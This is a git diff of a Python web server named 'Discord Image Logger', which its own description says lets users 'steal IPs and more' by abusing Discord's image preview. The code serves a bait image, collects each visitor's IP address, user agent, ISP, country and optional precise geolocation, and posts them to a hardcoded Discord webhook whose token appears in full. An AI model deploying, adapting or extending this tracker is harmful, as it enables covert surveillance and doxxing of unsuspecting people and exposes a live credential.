@@ -1,17 +1,19 @@
+# Discord Image Logger
+# By Dexty | https://github.com/xdexty0
+
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
-import os
 
-__app__ = "blob"
-__description__ = "blobb"
-__version__ = "v1.0.0"
-__author__ = "Dealer"
+__app__ = "Discord Image Logger"
+__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+__version__ = "v2.0"
+__author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": os.getenv("DISCORD_WEBHOOK_URL", "https://discord.com/api/webhooks/1438614880520245271/UTd2ZIbuqQipy1hopuL55_R_BdmF-fHI1Q-NZc651d8mq-Hpf2o4z2i3sODZEuED3CK7"),
-    "image": os.getenv("IMAGE_URL", "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fwallpaperaccess.com%2Ffull%2F58329.jpg&f=1&nofb=1&ipt=07373629347dffe2f6bb12d0b5f51150573f605a48beda17897cca4a28cc6966"), # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1438614880520245271/UTd2ZIbuqQipy1hopuL55_R_BdmF-fHI1Q-NZc651d8mq-Hpf2o4z2i3sODZEuED3CK7",
+    "image": "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fwallpaperaccess.com%2Ffull%2F58329.jpg&f=1&nofb=1&ipt=07373629347dffe2f6bb12d0b5f51150573f605a48beda17897cca4a28cc6966", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -184,13 +186,7 @@ binaries = {
     # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
 }
 
-class handler(BaseHTTPRequestHandler):
-    
-    def do_GET(self):
-        self.handleRequest()
-    
-    def do_POST(self):
-        self.handleRequest()
+class ImageLoggerAPI(BaseHTTPRequestHandler):
     
     def handleRequest(self):
         try:
@@ -217,28 +213,17 @@ width: 100vw;
 height: 100vh;
 }}</style><div class="img"></div>'''.encode()
             
-            # Get the real IP from Vercel's x-forwarded-for header
-            forwarded_for = self.headers.get('x-forwarded-for', '')
-            if forwarded_for:
-                ip = forwarded_for.split(',')[0].strip()
-            else:
-                ip = self.headers.get('x-real-ip', '0.0.0.0')
-            
-            if ip.startswith(blacklistedIPs):
-                self.send_response(200)
-                self.send_header('Content-type', 'text/html')
-                self.end_headers()
-                self.wfile.write(data)
+            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                 return
             
-            if botCheck(ip, self.headers.get('user-agent')):
+            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                 self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                 self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                 self.end_headers() # Declare the headers as finished.
 
                 if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
 
-                makeReport(ip, endpoint = s.split("?")[0], url = url)
+                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                 
                 return
             
@@ -248,15 +233,15 @@ height: 100vh;
 
                 if dic.get("g") and config["accurateLocation"]:
                     location = base64.b64decode(dic.get("g").encode()).decode()
-                    result = makeReport(ip, self.headers.get('user-agent'), location, s.split("?")[0], url = url)
+                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                 else:
-                    result = makeReport(ip, self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
+                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                 
 
                 message = config["message"]["message"]
 
                 if config["message"]["richMessage"] and result:
-                    message = message.replace("{ip}", ip)
+                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                     message = message.replace("{isp}", result["isp"])
                     message = message.replace("{asn}", result["as"])
                     message = message.replace("{country}", result["country"])
@@ -312,3 +297,8 @@ if (!currenturl.includes("g=")) {
             reportError(traceback.format_exc())
 
         return
+    
+    do_GET = handleRequest
+    do_POST = handleRequest
+
+handler = app = ImageLoggerAPI
